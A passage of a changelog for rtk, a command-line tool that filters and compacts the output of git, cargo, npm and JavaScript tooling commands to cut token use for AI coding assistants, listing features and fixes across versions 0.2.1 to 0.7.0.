* convert rtk ls from reimplementation to native proxy for better reliability
* trigger release build after release-please creates tag


### Documentation

* add execution time tracking test guide (TEST_EXEC_TIME.md)
* comprehensive parser infrastructure documentation (src/parser/README.md)

## [0.7.0](https://github.com/pszymkowiak/rtk/compare/v0.6.0...v0.7.0) (2026-02-01)


### Features

* add discover command, auto-rewrite hook, and git show support ([ff1c759](https://github.com/pszymkowiak/rtk/commit/ff1c7598c240ca69ab51f507fe45d99d339152a0))
* discover command, auto-rewrite hook, git show ([c9c64cf](https://github.com/pszymkowiak/rtk/commit/c9c64cfd30e2c867ce1df4be508415635d20132d))


### Bug Fixes

* forward args in rtk git push/pull to support -u, remote, branch ([4bb0130](https://github.com/pszymkowiak/rtk/commit/4bb0130695ad2f5d91123afac2e3303e510b240c))

## [0.6.0](https://github.com/pszymkowiak/rtk/compare/v0.5.2...v0.6.0) (2026-02-01)


### Features

* cargo build/test/clippy with compact output ([bfd5646](https://github.com/pszymkowiak/rtk/commit/bfd5646f4eac32b46dbec05f923352a3e50c19ef))
* curl with auto-JSON detection ([314accb](https://github.com/pszymkowiak/rtk/commit/314accbfd9ac82cc050155c6c47dfb76acab14ce))
* gh pr create/merge/diff/comment/edit + gh api ([517a93d](https://github.com/pszymkowiak/rtk/commit/517a93d0e4497414efe7486410c72afdad5f8a26))
* git branch, fetch, stash, worktree commands ([bc31da8](https://github.com/pszymkowiak/rtk/commit/bc31da8ad9d9e91eee8af8020e5bd7008da95dd2))
* npm/npx routing, pnpm build/typecheck, --skip-env flag ([49b3cf2](https://github.com/pszymkowiak/rtk/commit/49b3cf293d856ff3001c46cff8fee9de9ef501c5))
* shared infrastructure for new commands ([6c60888](https://github.com/pszymkowiak/rtk/commit/6c608880e9ecbb2b3569f875e7fad37d1184d751))
* shared infrastructure for new commands ([9dbc117](https://github.com/pszymkowiak/rtk/commit/9dbc1178e7f7fab8a0695b624ed3744ab1a8bf02))

## [0.5.2](https://github.com/pszymkowiak/rtk/compare/v0.5.1...v0.5.2) (2026-01-30)


### Bug Fixes

* release pipeline trigger and version-agnostic package URLs ([108d0b5](https://github.com/pszymkowiak/rtk/commit/108d0b5ea316ab33c6998fb57b2caf8c65ebe3ef))
* release pipeline trigger and version-agnostic package URLs ([264539c](https://github.com/pszymkowiak/rtk/commit/264539cf20a29de0d9a1a39029c04cb8eb1b8f10))

## [0.5.1](https://github.com/pszymkowiak/rtk/compare/v0.5.0...v0.5.1) (2026-01-30)


### Bug Fixes

* 3 issues (latest tag, ccusage fallback, versioning) ([d773ec3](https://github.com/pszymkowiak/rtk/commit/d773ec3ea515441e6c62bbac829f45660cfaccde))
* patrick's 3 issues (latest tag, ccusage fallback, versioning) ([9e322e2](https://github.com/pszymkowiak/rtk/commit/9e322e2aee9f7239cf04ce1bf9971920035ac4bb))

## [0.5.0](https://github.com/pszymkowiak/rtk/compare/v0.4.0...v0.5.0) (2026-01-30)


### Features

* add comprehensive claude code economics analysis ([ec1cf9a](https://github.com/pszymkowiak/rtk/commit/ec1cf9a56dd52565516823f55f99a205cfc04558))
* comprehensive economics analysis and code quality improvements ([8e72e7a](https://github.com/pszymkowiak/rtk/commit/8e72e7a8b8ac7e94e9b13958d8b6b8e9bf630660))


### Bug Fixes

* comprehensive code quality improvements ([5b840cc](https://github.com/pszymkowiak/rtk/commit/5b840cca492ea32488d8c80fd50d3802a0c41c72))
* optimize HashMap merge and add safety checks ([3b847f8](https://github.com/pszymkowiak/rtk/commit/3b847f863a90b2e9a9b7eb570f700a376bce8b22))

## [0.4.0](https://github.com/pszymkowiak/rtk/compare/v0.3.1...v0.4.0) (2026-01-30)


### Features

* add comprehensive temporal audit system for token savings analytics ([76703ca](https://github.com/pszymkowiak/rtk/commit/76703ca3f5d73d3345c2ed26e4de86e6df815aff))
* Comprehensive Temporal Audit System for Token Savings Analytics ([862047e](https://github.com/pszymkowiak/rtk/commit/862047e387e95b137973983b4ebad810fe5b4431))

## [0.3.1](https://github.com/pszymkowiak/rtk/compare/v0.3.0...v0.3.1) (2026-01-29)


### Bug Fixes

* improve command robustness and flag support ([c2cd691](https://github.com/pszymkowiak/rtk/commit/c2cd691c823c8b1dd20d50d01486664f7fd7bd28))
* improve command robustness and flag support ([d7d8c65](https://github.com/pszymkowiak/rtk/commit/d7d8c65b86d44792e30ce3d0aff9d90af0dd49ed))

## [0.3.0](https://github.com/pszymkowiak/rtk/compare/v0.2.1...v0.3.0) (2026-01-29)


### Features

* add --quota flag to rtk gain with tier-based analysis ([26b314d](https://github.com/pszymkowiak/rtk/commit/26b314d45b8b0a0c5c39fb0c17001ecbde9d97aa))
* add CI/CD automation (release management and automated metrics) ([22c3017](https://github.com/pszymkowiak/rtk/commit/22c3017ed5d20e5fb6531cfd7aea5e12257e3da9))
* add GitHub CLI integration (depends on [#9](https://github.com/pszymkowiak/rtk/issues/9)) ([341c485](https://github.com/pszymkowiak/rtk/commit/341c48520792f81889543a5dc72e572976856bbb))
* add GitHub CLI integration with token optimizations ([0f7418e](https://github.com/pszymkowiak/rtk/commit/0f7418e958b23154cb9dcf52089a64013a666972))
* add modern JavaScript tooling support ([b82fa85](https://github.com/pszymkowiak/rtk/commit/b82fa85ae5fe0cc1f17d8acab8c6873f436a4d62))
* add modern JavaScript tooling support (lint, tsc, next, prettier, playwright, prisma) ([88c0174](https://github.com/pszymkowiak/rtk/commit/88c0174d32e0603f6c5dcc7f969fa8f988573ec6))
* add Modern JS Stack commands to benchmark script ([b868987](https://github.com/pszymkowiak/rtk/commit/b868987f6f48876bb2ce9a11c9cad12725401916))
* add quota analysis with multi-tier support ([64c0b03](https://github.com/pszymkowiak/rtk/commit/64c0b03d4e4e75a7051eac95be2d562797f1a48a))
* add shared utils module for JS stack commands ([0fc06f9](https://github.com/pszymkowiak/rtk/commit/0fc06f95098e00addf06fe71665638ab2beb1aac))
* CI/CD automation (versioning, benchmarks, README auto-update) ([b8bbfb8](https://github.com/pszymkowiak/rtk/commit/b8bbfb87b4dc2b664f64ee3b0231e346a2244055))


### Bug Fixes

* **ci:** correct rust-toolchain action name ([9526471](https://github.com/pszymkowiak/rtk/commit/9526471530b7d272f32aca38ace7548fd221547e))

## [Unreleased]

### Added
- `prettier` command for format checking with package manager auto-detection (pnpm/yarn/npx)
  - Shows only files needing formatting (~70% token reduction)
  - Exit code preservation for CI/CD compatibility
- `playwright` command for E2E test output filtering (~94% token reduction)
  - Shows only test failures and slow tests
  - Summary with pass/fail counts and timing
- `lint` command with ESLint/Biome support and pnpm detection
  - Groups violations by rule and file (~84% token reduction)
  - Shows top violators for quick navigation
- `tsc` command for TypeScript compiler output filtering
  - Groups errors by file and error code (~83% token reduction)
  - Shows top 10 affected files
- `next` command for Next.js build/dev output filtering (87% token reduction)
  - Extracts route count and bundle sizes
  - Highlights warnings and oversized bundles
- `prisma` command for Prisma CLI output filtering
  - Removes ASCII art and verbose logs (~88% token reduction)
  - Supports generate, migrate (dev/status/deploy), and db push
- `utils` module with common utilities (truncate, strip_ansi, execute_command)
  - Shared functionality for consistent output formatting
  - ANSI escape code stripping for clean parsing

### Changed
- Refactored duplicated code patterns into `utils.rs` module
- Improved package manager detection across all modern JS commands

## [0.2.1] - 2026-01-29

See upstream: https://github.com/pszymkowiak/rtk

## Links

- **Repository**: https://github.com/rtk-ai/rtk (maintained by pszymkowiak)
- **Issues**: https://github.com/rtk-ai/rtk/issues
